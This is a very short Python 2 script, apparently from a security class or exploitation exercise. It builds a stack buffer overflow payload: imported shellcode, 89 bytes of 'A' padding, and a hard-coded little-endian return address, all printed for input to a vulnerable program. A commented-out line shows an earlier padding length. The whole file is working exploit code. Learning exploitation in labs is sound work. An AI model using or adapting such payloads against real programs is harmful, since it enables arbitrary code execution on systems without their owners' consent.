from shellcode import shellcode 
from struct import pack

print shellcode +"A"*89+ pack("<I",0xbffe8a4c)
#print shellcode + "A"*100
